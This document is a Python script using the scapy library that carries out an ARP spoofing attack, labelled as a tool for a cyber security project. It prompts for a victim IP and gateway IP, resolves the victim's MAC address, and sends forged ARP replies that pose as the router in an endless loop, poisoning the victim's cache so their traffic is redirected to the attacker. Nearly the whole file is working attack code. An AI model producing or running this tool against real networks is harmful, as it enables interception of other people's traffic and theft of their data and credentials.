import scapy.all as scapy
import time
import sys

def get_mac(ip):
    """
    Sends an ARP Request to discover the MAC address of a given IP address.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_packet = broadcast / arp_request
    
    answered_list = scapy.srp(arp_request_packet, timeout=2, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def create_arp_spoof_packet(victim_ip, gateway_ip, victim_mac, hacker_mac):
    """
    Constructs the malicious ARP Reply packet.
    """
    ether_layer = scapy.Ether(dst=victim_mac) 
    arp_layer = scapy.ARP(
        op=2,                  # 2 specifies an ARP Reply
        pdst=victim_ip,        # Target IP (Victim)
        hwdst=victim_mac,      # Target MAC (Victim)
        psrc=gateway_ip,       # IP the hacker impersonates (Gateway/Router)
        hwsrc=hacker_mac       # Real MAC of the hacker (Redirects traffic here)
    )
    return ether_layer / arp_layer

# ========================================================================
# --- Execution Section ---
# ========================================================================

print("=== ARP Spoofing Tool for Cyber Security Project ===")

# Here the program ASKS you to type the IPs manually:
victim_ip = input("[?] Enter Victim IP address: ")
gateway_ip = input("[?] Enter Gateway (Router) IP address: ")

try:
    # Automatically detect your own MAC address
    hacker_mac = scapy.get_if_hwaddr(scapy.conf.iface)
    print(f"[+] Hacker MAC detected automatically: {hacker_mac}")
    
    # Automatically discover the victim's MAC address using the function
    print("[*] Discovering target MAC address... Please wait.")
    victim_mac = get_mac(victim_ip)
    
    if not victim_mac:
        print(f"[-] Error: Could not find MAC address for {victim_ip}. Verify the host is online.")
        sys.exit(1)
        
    print(f"[+] Victim MAC discovered successfully: {victim_mac}")
    print("-" * 60)

    # Generate the spoofed ARP packet
    spoof_packet = create_arp_spoof_packet(victim_ip, gateway_ip, victim_mac, hacker_mac)

    print(f"[+] Starting ARP Spoofing attack against {victim_ip}...")
    print("[+] Sending packets loop... Press Ctrl+C to stop and exit.")

    # Infinite loop to keep the network cache poisoned
    while True:
        scapy.sendp(spoof_packet, verbose=False)
        print(".", end="", flush=True) 
        time.sleep(2)

except KeyboardInterrupt:
    print("\n\n[-] Attack stopped by the user.")
    print("[+] Safely exiting the program.")
    sys.exit(0)